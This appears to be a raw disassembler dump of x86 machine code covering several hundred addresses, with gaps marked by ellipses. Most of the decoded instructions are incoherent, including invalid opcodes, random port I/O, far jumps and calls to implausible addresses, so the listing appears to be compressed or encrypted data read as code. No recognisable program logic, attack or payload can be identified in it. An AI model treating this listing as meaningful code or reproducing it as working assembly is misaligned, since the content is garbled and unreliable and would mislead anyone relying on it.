  416b31:	clc    
  416b32:	(bad)  
  416b34:	aam    0x0
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0xefa56b6b
  416ba3:	pop    ds
  416ba4:	pop    esi
  416ba5:	sbb    al,0xbf
  416ba7:	in     eax,dx
  416ba8:	add    BYTE PTR [eax],al
  416baa:	pop    es
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [ebp+0x21a14f01],ch
  416bb3:	jmp    0x9211:0x47e439bf
  416bba:	xchg   edx,eax
  416bbb:	mov    ebp,0xa017d13c
  416bc0:	out    0xe8,al
  416bc2:	and    edx,DWORD PTR ds:0xab1a285
  416bc8:	cli    
  416bc9:	cmp    eax,0x8ef4607f
  416bce:	cld    
  416bcf:	test   al,0xe
  416bd1:	pop    edi
  416bd2:	hlt    
  416bd3:	int    0x7b
  416bd5:	jg     0x416b81
  416bd7:	pop    edx
  416bd8:	enter  0x8866,0x2a
  416bdc:	sar    DWORD PTR [eax],1
  416bde:	je     0x416c59
  416be0:	pop    ds
  416be1:	lahf   
  416be2:	cmp    edx,DWORD PTR [ebx]
  416be4:	fs add ecx,edx
  416be7:	mov    ecx,DWORD PTR [esi]
  416be9:	call   0x67bac4e2
  416bee:	inc    ebx
  416bef:	push   edx
  416bf0:	into   
  416bf1:	mov    ebx,0xd9246df1
  416bf6:	inc    eax
  416bf7:	sbb    edi,DWORD PTR [ecx]
  416bf9:	mov    edx,0x62069c0c
  416bfe:	dec    eax
  416bff:	xor    esp,DWORD PTR [edx-0x6aaf0894]
  416c05:	mov    cl,0x23
  416c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c08:	(bad)  
  416c09:	test   DWORD PTR [edx],0xa402f447
  416c0f:	lods   eax,DWORD PTR ds:[esi]
  416c10:	sub    al,0xf9
  416c12:	scas   al,BYTE PTR es:[edi]
  416c13:	call   0x92b0356a
  416c18:	mov    edx,0x7308987c
  416c1d:	dec    edx
  416c1e:	mov    edi,0xf8f25a20
  416c23:	ins    BYTE PTR es:[edi],dx
  416c24:	and    eax,0xd35e3699
  416c29:	stc    
  416c2a:	in     al,0xee
  416c2c:	push   ss
  416c2d:	pop    esi
  416c2e:	loope  0x416c13
  416c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c31:	and    dl,0x8f
  416c34:	fsub   st(2),st
  416c36:	int    0x0
  416c38:	(bad)  
  416c39:	scas   al,BYTE PTR es:[edi]
  416c3a:	stc    
  416c3b:	rol    BYTE PTR [esi],1
  416c3d:	mov    ch,0xa
  416c3f:	jecxz  0x416cb1
  416c41:	int    0xbf
  416c43:	xchg   esp,eax
  416c44:	mov    ch,0x9c
  416c46:	push   edi
  416c47:	outs   dx,DWORD PTR ds:[esi]
  416c48:	push   DWORD PTR [eax+0x2f]
  416c4b:	lods   al,BYTE PTR ds:[esi]
  416c4c:	ja     0x416c6b
  416c4e:	pop    eax
  416c4f:	cld    
  416c50:	je     0x416c8c
  416c52:	call   0x93a1535d
  416c57:	stos   DWORD PTR es:[edi],eax
  416c58:	jbe    0x416bdb
  416c5a:	push   0xbb6d403
  416c5f:	loop   0x416cd2
  416c61:	pop    edx
  416c62:	iret   
  416c63:	fistp  QWORD PTR [edx]
  416c65:	sbb    DWORD PTR [esi+esi*8+0x62d0d094],esi
  416c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c6d:	xchg   esp,eax
  416c6e:	push   esp
  416c6f:	xchg   ebx,eax
  416c70:	cmp    ebx,DWORD PTR [ebp+0x5a]
  416c73:	js     0x416c13
  416c75:	adc    edi,eax
  416c77:	mov    dh,0xad
  416c79:	inc    ebx
  416c7a:	sbb    bl,bh
  416c7c:	call   0xbb17ad84
  416c81:	aas    
  416c82:	xlat   BYTE PTR ds:[ebx]
  416c83:	mov    edx,0x8a187b58
  416c88:	pop    ds
  416c89:	imul   DWORD PTR [edi-0x174616ae]
  416c8f:	mov    DWORD PTR [ebp+0x45fd688b],ebp
  416c95:	retf   0x927d
  416c98:	bt     DWORD PTR [ebx],ecx
  416c9b:	(bad)
  416c9f:	jp     0x416c6b
  416ca1:	mov    esi,0x5a31cc65
  416ca6:	lds    edi,FWORD PTR [ebx]
  416ca8:	outs   dx,DWORD PTR ds:[esi]
  416ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416caa:	fadd   QWORD PTR [ecx+0x17]
  416cad:	jle    0x416c57
  416caf:	out    0x5c,al
  416cb1:	adc    ebp,DWORD PTR [edx+0x88e2]
	...
  416d13:	add    BYTE PTR [eax],al
  416d15:	add    BYTE PTR [ecx],ah
  416d17:	xchg   ebx,eax
  416d18:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d1e:	or     DWORD PTR ds:0x8ebc80c9,edi
  416d24:	cmp    bh,BYTE PTR ds:0xeec6
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    ch,bl
  416d2f:	push   ebp
  416d30:	xchg   esp,eax
  416d31:	lds    edx,FWORD PTR [eax+edi*4+0x68]
  416d35:	pop    es
  416d36:	pop    es
  416d37:	cld    
  416d38:	call   0xe54927dc
  416d3d:	imul   eax,DWORD PTR [esi],0x62f4e8a7
  416d43:	jl     0x416d4c
  416d45:	cdq    
  416d46:	sub    eax,0xcfa94875
  416d4b:	arpl   WORD PTR [esi],bp
  416d4d:	lods   al,BYTE PTR ds:[esi]
  416d4e:	push   0xef104b1f
  416d53:	ja     0x416d20
  416d55:	fistp  DWORD PTR [eax+ebp*2+0x33daca4a]
  416d5c:	stos   BYTE PTR es:[edi],al
  416d5d:	jg     0x416d84
  416d5f:	push   esp
  416d60:	cmp    dl,0x3f
  416d63:	cwde   
  416d64:	mov    eax,0xe41e13be
  416d69:	fwait
  416d6a:	mov    bl,0x66
  416d6c:	sar    BYTE PTR [edi],1
  416d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d6f:	stos   BYTE PTR es:[edi],al
  416d70:	push   edx
  416d71:	cmp    DWORD PTR [ebx-0x64],ecx
  416d74:	lea    edi,[esi+0x4]
  416d77:	or     ecx,esi
  416d79:	dec    esi
  416d7a:	in     eax,dx
  416d7b:	aaa    
  416d7c:	add    eax,0x55e753be
  416d81:	clc    
  416d82:	mov    bh,cl
  416d84:	pop    ss
  416d85:	(bad)  
  416d86:	outs   dx,BYTE PTR ds:[esi]
  416d87:	test   eax,0x56d360af
  416d8c:	xchg   ebp,eax
  416d8d:	mov    al,0x63
  416d8f:	(bad)  
  416d91:	adc    dh,ch
  416d93:	arpl   WORD PTR [ebp+0x1872ddb7],si
  416d99:	add    al,0xab
  416d9b:	nop
  416d9c:	jge    0x416d99
  416d9e:	aaa    
  416d9f:	inc    eax
  416da0:	inc    ecx
  416da1:	nop
  416da2:	test   al,0x0
  416da4:	pop    ss
  416da5:	or     DWORD PTR [eax-0x3aad19a9],edx
  416dab:	push   DWORD PTR [edx]
  416dad:	xor    ecx,DWORD PTR [ecx+esi*2-0x7d]
  416db1:	adc    BYTE PTR [esi],al
  416db3:	call   FWORD PTR [edx-0x32]
  416db6:	push   ebp
  416db7:	push   ds
  416db8:	add    al,0x70
  416dba:	cli    
  416dbb:	ds xchg esi,eax
  416dbd:	push   cs
  416dbe:	fbld   TBYTE PTR [edi+0x11]
  416dc1:	adc    al,0x89
  416dc3:	xor    eax,DWORD PTR [edx]
  416dc5:	mov    ebp,0x297ebd26
  416dca:	data16 arpl cx,sp
  416dcd:	outs   dx,BYTE PTR ds:[esi]
  416dce:	sbb    eax,0xcf2d9da0
  416dd3:	sbb    ecx,DWORD PTR [ebx]
  416dd5:	mov    edx,0x98a63c4e
  416dda:	mov    cl,0x5c
  416ddc:	mov    bh,BYTE PTR [ebx+0x5f5a672c]
  416de2:	pop    ds
  416de3:	xor    al,BYTE PTR [ebp-0x2d]
  416de6:	repnz and al,0x47
  416de9:	dec    edi
  416dea:	mov    esp,DWORD PTR [esi-0x28018276]
  416df0:	fadd   QWORD PTR [ebp+0x78]
  416df3:	dec    esi
  416df4:	sbb    eax,0x12f95efa
  416df9:	jae    0x416da1
  416dfb:	daa    
  416dfc:	in     al,0x7b
  416dfe:	mov    dh,0x4f
  416e00:	sahf   
  416e01:	inc    esp
  416e02:	imul   eax,edx,0x79
  416e05:	mov    bh,0xa1
  416e07:	push   ebx
  416e08:	lea    edx,[esi]
  416e0a:	cmp    dl,BYTE PTR [eax]
  416e0c:	scas   al,BYTE PTR es:[edi]
  416e0d:	push   ebx
  416e0e:	xchg   edi,eax
  416e0f:	mov    bl,0x21
  416e11:	(bad)  [esi+eax*2+0x42]
  416e15:	inc    ebp
  416e16:	repnz loop 0x416df5
  416e19:	sbb    eax,0x5e286a74
  416e1e:	addr16 pop es
  416e20:	push   cs
  416e21:	ins    DWORD PTR es:[edi],dx
  416e22:	jne    0x416e21
  416e24:	retf   
  416e25:	ficom  DWORD PTR [ebp+esi*8+0x1a]
  416e29:	cli    
  416e2a:	mov    eax,0x62125b5f
  416e2f:	xchg   esi,esp
  416e31:	test   eax,0xb1f241
	...
  416e96:	mov    edi,0xae6d8e19
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x13e677e9]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR [eax+0x79],ah
  416eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eb1:	rcl    BYTE PTR [eax-0x24],1
  416eb4:	sbb    eax,0xb7d21731
  416eb9:	and    ebx,ebx
  416ebb:	(bad)  
  416ebc:	ins    DWORD PTR es:[edi],dx
  416ebd:	daa    
  416ebe:	mov    ah,0x0
  416ec0:	xchg   edx,eax
  416ec1:	jb     0x416f25
  416ec3:	mov    edx,0x91345288
  416ec8:	mov    ds:0x7b91870,al
  416ecd:	jmp    0xd472:0xc1e449ef
  416ed4:	inc    eax
  416ed5:	aas    
  416ed6:	aas    
  416ed7:	xor    edx,DWORD PTR [eax+0x1ce17dad]
  416edd:	retf   
  416ede:	inc    ebp
  416edf:	sbb    al,0x81
  416ee1:	popa   
  416ee2:	adc    al,0xd3
  416ee4:	call   0xd2d9f70
  416ee9:	pushf  
  416eea:	leave  
  416eeb:	jp     0x416f6c
  416eed:	hlt    
  416eee:	push   cs
  416eef:	shl    DWORD PTR [edi-0x32b625dd],1
  416ef5:	bsr    edx,eax
  416ef8:	pop    ebx
  416ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416efa:	ds mov esp,0x1d66637a
  416f00:	dec    edx
  416f01:	ss sub ebp,DWORD PTR fs:[ebx+0x26]
  416f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f07:	test   BYTE PTR [ebx],al
  416f09:	in     al,0x12
  416f0b:	and    esp,edi
  416f0d:	in     al,0xef
  416f0f:	ret    0x1f11
  416f12:	push   edx
  416f13:	push   ecx
  416f14:	push   edx
  416f15:	and    eax,0x55ec128
  416f1a:	dec    edx
  416f1b:	test   al,0xbb
  416f1d:	sub    al,0xbf
  416f1f:	cmp    al,0xe7
  416f21:	xor    BYTE PTR [esi],bh
  416f23:	rol    DWORD PTR [edi],0xaf
  416f26:	sub    bl,ah
  416f28:	pusha  
  416f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f2a:	inc    edi
  416f2b:	sub    al,0x4d
  416f2d:	xor    al,0x75
  416f2f:	or     DWORD PTR [edi-0x56471fc0],edi
  416f35:	mov    dl,0xc3
  416f37:	dec    ecx
  416f38:	inc    esi
  416f39:	test   DWORD PTR [esi-0x71],0x87cf7806
  416f40:	(bad)  
  416f41:	repnz inc esp
  416f43:	xor    al,0x3c
  416f45:	add    eax,0xaa9f9d74
  416f4a:	mov    esp,0x1b1ae2a5
  416f4f:	mov    ebx,DWORD PTR [ebx-0x7fb0dad9]
  416f55:	shr    al,1
  416f57:	dec    edx
  416f58:	xor    ah,BYTE PTR [ebp+0x75]
  416f5b:	pop    edx
  416f5c:	mov    bl,0xe1
  416f5e:	add    al,0xd1
  416f60:	cmc    
  416f61:	fcos   
  416f63:	aam    0x38
  416f65:	retf   
  416f66:	int    0x5a
  416f68:	pusha  
  416f69:	rcr    DWORD PTR [ebx],1
  416f6b:	loop   0x416fec
  416f6d:	dec    esi
  416f6e:	(bad)  
  416f6f:	je     0x416f19
  416f71:	loope  0x416f54
  416f73:	sub    bh,BYTE PTR [ebp+0x76]
  416f76:	sbb    eax,0xd19e4043
  416f7b:	sub    eax,DWORD PTR [esi]
  416f7d:	ficomp DWORD PTR [ebx+0x2113a7d7]
  416f83:	repnz imul edi,DWORD PTR [edx],0x387f1c8
  416f8a:	int    0x6e
  416f8c:	rol    BYTE PTR [edi-0x7354961f],0x3e
  416f93:	push   edx
  416f94:	ins    DWORD PTR es:[edi],dx
  416f95:	(bad)  
  416f96:	pop    eax
  416f97:	add    BYTE PTR [edi+0x65],bh
  416f9a:	ficomp WORD PTR [esi]
  416f9c:	shl    dh,0xef
  416f9f:	data16 jae 0x416f89
  416fa2:	js     0x416fc8
  416fa4:	lods   eax,DWORD PTR ds:[esi]
  416fa5:	push   cs
  416fa6:	out    0x1b,eax
  416fa8:	cmovbe esp,edi
  416fab:	dec    ebp
  416fac:	shl    BYTE PTR [ecx+0x4e],1
  416faf:	xor    al,0x35
  416fb1:	je     0x416fb3
  416fb3:	inc    ebx
  416fb4:	xchg   BYTE PTR [eax],al
	...
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	xchg   BYTE PTR [ebx],dl
  417024:	inc    edi
  417025:	stc    
  417026:	aam    0xf0
  417028:	add    BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [ebx-0xc5a8d36],dl
  417033:	cld    
  417034:	xchg   esp,eax
  417035:	sar    DWORD PTR [edi-0x74],0x39
  417039:	pop    esp
  41703a:	lea    ebx,[edx+0x3172ce3a]
  417040:	mov    ch,0xe3
  417042:	lds    edi,FWORD PTR [ebp+ebp*1-0x18c154a7]
  417049:	ins    BYTE PTR es:[edi],dx
  41704a:	enter  0x76b2,0x26
  41704e:	push   edx
  41704f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417050:	pop    eax
  417051:	fdivr  st(2),st
  417053:	inc    edi
  417054:	or     al,BYTE PTR [edx]
  417056:	scas   eax,DWORD PTR es:[edi]
  417057:	jo     0x417086
  417059:	adc    eax,0x98a1cc00
  41705e:	ss jns 0x417003
  417061:	inc    ebp
  417062:	into   
  417063:	ja     0x41702d
  417065:	or     BYTE PTR [ebx-0x72676e83],ah
  41706b:	and    al,0x91
  41706d:	push   0x6c
  41706f:	aad    0xea
  417071:	or     dl,al
  417073:	cmc    
  417074:	out    dx,al
  417075:	push   ds
  417076:	sub    BYTE PTR ds:0xfe0d1ee0,ch
  41707c:	push   ecx
  41707d:	push   0x6e5b8155
  417082:	xor    BYTE PTR [esi],0x5b
  417085:	hlt    
  417086:	cmp    DWORD PTR [ebp-0x3b],ebx
  417089:	in     al,0xfd
  41708b:	adc    eax,0x73464924
  417090:	aam    0xe4
  417092:	dec    eax
  417094:	not    bl
  417096:	dec    ecx
  417097:	pop    edx
  417098:	(bad)
  41709c:	mov    DWORD PTR [esi+0x3fbcbd97],ebx
  4170a2:	shr    esi,cl
  4170a4:	fdivr  DWORD PTR [edi]
  4170a6:	imul   edx,DWORD PTR [ebp+0x65c0ba27],0xffffffb8
  4170ad:	ins    DWORD PTR es:[edi],dx
  4170ae:	arpl   WORD PTR [edi+0x17],ax
  4170b1:	scas   al,BYTE PTR es:[edi]
  4170b2:	cli    
  4170b3:	in     al,0xec
  4170b5:	sub    DWORD PTR ds:0xa083a83b,esi
  4170bb:	sbb    BYTE PTR [ecx+0x29],dl
  4170be:	fisttp WORD PTR [esi+0x47]
  4170c1:	dec    ebp
  4170c2:	shl    BYTE PTR [ecx+0x17],1
  4170c5:	jmp    0x417057
  4170c7:	mov    cl,0xc5
  4170c9:	int3   
  4170ca:	inc    ebp
  4170cb:	push   edi
  4170cc:	sar    DWORD PTR [ecx],1
  4170ce:	rcl    DWORD PTR [esi+ecx*8+0x2b],cl
  4170d2:	mov    ah,0x81
  4170d4:	xchg   ebp,eax
  4170d5:	fadd   QWORD PTR [eax+0x3225a514]
  4170db:	jbe    0x417147
  4170dd:	setne  BYTE PTR ds:0xfce5849e
  4170e4:	and    ecx,esp
  4170e6:	out    0x1d,eax
  4170e8:	push   esi
  4170e9:	arpl   dx,bx
  4170eb:	dec    edi
  4170ec:	cmc    
  4170ed:	jnp    0x4170c9
  4170ef:	inc    esp
  4170f0:	cmp    edx,DWORD PTR [ebx-0x3e9c5815]
  4170f6:	mov    dl,0x74
  4170f8:	jmp    0x84d22e7e
  4170fd:	dec    esi
  4170fe:	xsha256 (bad)
  4170ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417100:	(bad)  
  417101:	xchg   edi,eax
  417102:	pop    edi
  417103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417104:	jnp    0x4170db
  417106:	arpl   si,ax
  417108:	mov    al,0xd
  41710a:	ja     0x4170f0
  41710c:	xchg   edi,eax
  41710d:	push   edi
  41710e:	std    
  41710f:	div    DWORD PTR [edx+0x57]
  417112:	mov    eax,ds:0xe8c2652f
  417117:	retf   
  417118:	(bad)  
  417119:	loopne 0x4170eb
  41711b:	int3   
  41711c:	sahf   
  41711d:	adc    eax,0x4a91954
  417122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417123:	ret    0xce30
  417126:	lods   al,BYTE PTR ds:[esi]
  417127:	cmp    esp,DWORD PTR [edi-0xa]
  41712a:	pop    esi
  41712b:	rcr    BYTE PTR [edi+0x7ce802b8],0x91
  417132:	lods   al,BYTE PTR ds:[esi]
  417133:	mov    esp,0xac
	...
  417194:	add    BYTE PTR [eax],al
  417196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417197:	sbb    DWORD PTR [eax+0x1a],esi
  41719a:	(bad)  
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	cmp    eax,0xdb751278
  4171a7:	icebp  
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [edi],ch
  4171af:	xchg   ebp,eax
  4171b0:	rcl    DWORD PTR [ebp+eiz*8-0x657b5a78],1
  4171b7:	ror    edx,0xc0
  4171ba:	jne    0x417167
  4171bc:	xchg   BYTE PTR [esi+0x23477498],dh
  4171c2:	lods   al,BYTE PTR ds:[esi]
  4171c3:	loope  0x41714c
  4171c5:	sbb    ebp,DWORD PTR [ebx+0xf]
  4171c8:	les    ecx,FWORD PTR [esi]
  4171ca:	add    DWORD PTR [edx-0x726f29be],edi
  4171d0:	dec    ebp
  4171d1:	rcl    DWORD PTR [eax],0x0
  4171d4:	call   0x68f91c77
  4171d9:	add    edi,ebp
  4171db:	xor    al,0x6a
  4171dd:	adc    ah,BYTE PTR [ebp+eiz*1-0x30465187]
  4171e4:	fcmovu st,st(7)
  4171e6:	or     cl,BYTE PTR [eax+ebp*1-0x5a]
  4171ea:	xor    esi,ebx
  4171ec:	add    esi,DWORD PTR [ebp+ecx*4+0x66b53dc1]
  4171f3:	lea    ecx,[edx+0x3002d91a]
  4171f9:	or     eax,0x80d038a
  4171fe:	inc    esi
  4171ff:	dec    ecx
  417200:	xchg   al,dh
  417202:	add    DWORD PTR [edx],0xffffffcd
  417205:	push   es
  417206:	jns    0x4171bc
  417208:	pushf  
  417209:	mov    dh,0xe4
  41720b:	mov    edi,0xf022444c
  417210:	inc    ebx
  417211:	pushf  
  417212:	push   eax
  417213:	lahf   
  417214:	sbb    eax,0xa46eb3fb
  417219:	in     eax,dx
  41721a:	loopne 0x4171aa
  41721c:	xchg   esi,eax
  41721d:	and    DWORD PTR [edi-0x63ceb7e],ebx
  417223:	sti    
  417224:	dec    esi
  417225:	outs   dx,BYTE PTR ds:[esi]
  417226:	ficom  WORD PTR ds:0xf785d24e
  41722c:	mov    ebp,esp
  41722e:	add    al,0x36
  417230:	dec    esi
  417231:	mov    ebp,0x9d8fafac
  417236:	mov    al,ds:0xbb256a5
  41723b:	fst    QWORD PTR ds:0x7a82a6d4
  417241:	je     0x417294
  417243:	scas   eax,DWORD PTR es:[edi]
  417244:	cmp    eax,eax
  417246:	xor    BYTE PTR ds:0x760ab2c,al
  41724c:	sbb    BYTE PTR [edi],ch
  41724e:	jge    0x41723a
  417250:	nop
  417251:	sbb    edx,eax
  417253:	xchg   edi,eax
  417254:	xchg   edx,eax
  417255:	sub    al,0x1
  417257:	scas   eax,DWORD PTR es:[edi]
  417258:	fdiv   DWORD PTR [eax+0x41]
  41725b:	dec    edi
  41725c:	es xchg ebp,eax
  41725e:	or     DWORD PTR [eax],esi
  417260:	es jno 0x417276
  417263:	jle    0x417207
  417265:	dec    ecx
  417266:	cmp    esp,eax
  417268:	xchg   esp,eax
  417269:	mov    ebx,0x538bdc8d
  41726e:	stos   BYTE PTR es:[edi],al
  41726f:	in     al,0x97
  417271:	xlat   BYTE PTR ds:[ebx]
  417272:	lea    edi,[eax-0x3e]
  417275:	mov    dl,0xe2
  417277:	sub    al,0x57
  417279:	mov    ds:0x53379c7f,eax
  41727e:	adc    al,0xdb
  417280:	and    BYTE PTR [edx],dl
  417282:	adc    al,0x1f
  417284:	(bad)  
  417286:	jno    0x417228
  417288:	das    
  417289:	(bad)  
  41728a:	push   edx
  41728b:	fcmovnbe st,st(3)
  41728d:	and    al,0xf9
  41728f:	sub    eax,0x799e6789
  417294:	(bad)  
  417295:	sahf   
  417296:	mov    edi,0xaa948703
  41729b:	adc    ecx,DWORD PTR ds:0x264c6ac7
  4172a1:	fisubr WORD PTR [ebp-0x75a513d3]
  4172a7:	repz jbe 0x4172c8
  4172aa:	dec    edi
  4172ab:	sbb    cl,cl
  4172ad:	adc    ch,ch
  4172af:	jle    0x4172ae
  4172b1:	repnz imul edi,DWORD PTR [esi+0x58],0x0
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	pop    edx
  417323:	pop    ebp
  417324:	adc    BYTE PTR [ecx],cl
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    ah,ch
  41732f:	inc    edx
  417330:	push   esi
  417331:	sub    dh,BYTE PTR [eax+0x11]
  417334:	sub    DWORD PTR [esi-0x57a58ca3],0xb
  41733b:	cmp    al,0x17
  41733d:	pushf  
  41733e:	mov    ds:0xd61fb53c,eax
  417343:	jnp    0x4172d1
  417345:	push   ds
  417346:	add    BYTE PTR [edi-0x4a],ch
  417349:	mov    bl,ah
  41734b:	nop
  41734c:	mov    WORD PTR [esi-0x74],es
  41734f:	mov    ds:0x96b8b3bd,al
  417354:	dec    edx
  417355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417356:	mov    ss,WORD PTR [ebx]
  417358:	or     eax,0xcea30c79
  41735d:	stos   DWORD PTR es:[edi],eax
  41735e:	xchg   edi,eax
  41735f:	aaa    
  417360:	push   ebp
  417361:	push   edi
  417362:	fnstenv [esi]
  417364:	adc    dl,ah
  417366:	mov    ss,esi
  417368:	out    dx,al
  417369:	hlt    
  41736a:	cld    
  41736b:	xchg   esp,eax
  41736c:	mov    al,ds:0x921445cd
  417371:	adc    esi,0x13bab9d1
  417377:	mov    dl,0xc0
  417379:	loope  0x41738b
  41737b:	jl     0x41733d
  41737d:	into   
  41737e:	xchg   BYTE PTR [ecx+0x76278c80],ch
  417384:	bound  eax,QWORD PTR [ecx]
  417386:	cwde   
  417387:	scas   eax,DWORD PTR es:[edi]
  417388:	lea    edi,[edi+ebx*1-0x67]
  41738c:	pop    esp
  41738d:	and    ebp,0x4e17900b
  417393:	repnz pop ax
  417396:	js     0x417353
  417398:	les    ebp,FWORD PTR [esp+ebx*2+0x4bb76105]
  41739f:	test   eax,0xcb69ca44
  4173a4:	jmp    0xd07c1cc8
  4173a9:	xlat   BYTE PTR ds:[ebx]
  4173aa:	shl    DWORD PTR [edi+0x25848f70],1
  4173b0:	or     al,0xce
  4173b2:	xchg   ebx,eax
  4173b3:	add    al,BYTE PTR [ebx+0x35654bb9]
  4173b9:	les    eax,FWORD PTR [eax-0x5a]
  4173bc:	adc    ebp,DWORD PTR [edx+0x2b]
  4173bf:	mov    bl,0x92
  4173c1:	(bad)  
  4173c3:	mov    ebx,0x370f35d4
  4173c8:	pop    ds
  4173c9:	mov    BYTE PTR [ecx],bh
  4173cb:	aas    
  4173cc:	gs mov bl,0xfd
  4173cf:	ins    DWORD PTR es:[edi],dx
  4173d0:	inc    edx
  4173d1:	lods   al,BYTE PTR ds:[esi]
  4173d2:	mov    DWORD PTR [ecx],eax
  4173d4:	xor    bl,BYTE PTR ds:0x55e09110
  4173da:	mov    DWORD PTR ss:[edx-0x57],esp
  4173de:	ja     0x4173b7
  4173e0:	jo     0x417454
  4173e2:	push   esp
  4173e3:	push   ds
  4173e4:	aad    0x84
  4173e6:	xchg   ebx,eax
  4173e7:	mov    ch,0xee
  4173e9:	adc    DWORD PTR [edi+0x4c],edx
  4173ec:	push   edi
  4173ed:	ja     0x41743c
  4173ef:	mov    DWORD PTR [esi-0x52],eax
  4173f2:	jae    0x4173ae
  4173f4:	push   ebp
  4173f5:	std    
  4173f6:	mov    cl,0x1f
  4173f8:	sti    
  4173f9:	mov    bh,0x4a
  4173fb:	jnp    0x41738e
  4173fd:	imul   ebp,DWORD PTR [edi-0x15],0x716d42d
  417404:	pop    esi
  417405:	pop    ecx
  417406:	inc    eax
  417407:	inc    ebx
  417408:	stos   DWORD PTR es:[edi],eax
  417409:	or     esp,ebx
  41740b:	(bad)  [ebp+0x52]
  41740e:	pusha  
  41740f:	fwait
  417410:	mov    ah,0x90
  417412:	out    0xad,eax
  417414:	cmp    al,0x22
  417416:	ficom  WORD PTR [ecx+0x1d]
  417419:	and    ah,cl
  41741b:	icebp  
  41741c:	ja     0x4173a2
  41741e:	jns    0x4173ee
  417420:	nop
  417421:	ret    0x9b5e
  417424:	bound  ebp,QWORD PTR [ebp+0x69]
  417427:	ja     0x4173ab
  417429:	jg     0x417488
  41742b:	push   esp
  41742c:	push   esi
  41742d:	hlt    
  41742e:	(bad)  
  417430:	ins    DWORD PTR es:[edi],dx
  417431:	mov    dh,0x2e
  417433:	pushf  
  417434:	push   ecx
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a3:	out    dx,al
  4174a4:	or     al,BYTE PTR [edi]
  4174a6:	jmp    0x741759e
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    dl,dl
  4174af:	xchg   DWORD PTR [ebp-0x6c],ebp
  4174b2:	mov    ecx,0xe3a7a49f
  4174b7:	mov    esi,0x6fe1e871
  4174bc:	xor    DWORD PTR [ebx+0x669976df],0x8188d62a
  4174c6:	(bad)  
  4174c7:	pop    esp
  4174c8:	sbb    eax,0x2f
  4174cb:	out    dx,al
  4174cc:	rcr    DWORD PTR [eax+0x29],cl
  4174cf:	xchg   edi,eax
  4174d0:	xor    eax,0xa9bda0fe
  4174d5:	pushf  
  4174d6:	(bad)  [ebx-0x249f4602]
  4174dc:	cmc    
  4174dd:	stc    
  4174de:	xchg   edi,eax
  4174df:	xchg   esp,eax
  4174e0:	cmp    esp,DWORD PTR ds:0x733b85d
  4174e6:	les    ebx,FWORD PTR [ebp-0x5a79a04d]
  4174ec:	gs pushf 
  4174ee:	dec    esi
  4174ef:	into   
  4174f0:	adc    al,0x26
  4174f2:	daa    
  4174f3:	(bad)  
  4174f4:	aas    
  4174f5:	and    bl,bh
  4174f7:	adc    eax,0x117addfe
  4174fc:	fldcw  WORD PTR [ebp-0x22]
  4174ff:	stos   BYTE PTR es:[edi],al
  417500:	xchg   edi,eax
  417501:	jecxz  0x4174b7
  417503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417504:	sar    BYTE PTR [bx],cl
  417507:	sbb    eax,0x45e00a2f
  41750c:	es jp  0x417584
  41750f:	push   ebx
  417510:	inc    edi
  417511:	ins    DWORD PTR es:[edi],dx
  417512:	aam    0x73
  417514:	sub    DWORD PTR [esi],edi
  417516:	mov    esi,0xb30c202f
  41751b:	mov    esp,0xa3d62c15
  417520:	mov    edi,0x81f1c4eb
  417525:	setnp  BYTE PTR [esi]
  417528:	inc    ebx
  417529:	iret   
  41752a:	test   BYTE PTR [edx-0x8],bl
  41752d:	xchg   edi,eax
  41752e:	mov    edx,0x2eef251
  417533:	scas   al,BYTE PTR es:[edi]
  417534:	xchg   edx,eax
  417535:	jbe    0x417542
  417537:	cmp    DWORD PTR [eax],edi
  417539:	jmp    0x93a1:0xf378f7a8
  417540:	mov    eax,0xc6e5095a
  417545:	ss jle 0x417517
  417548:	(bad)  
  417549:	adc    dl,al
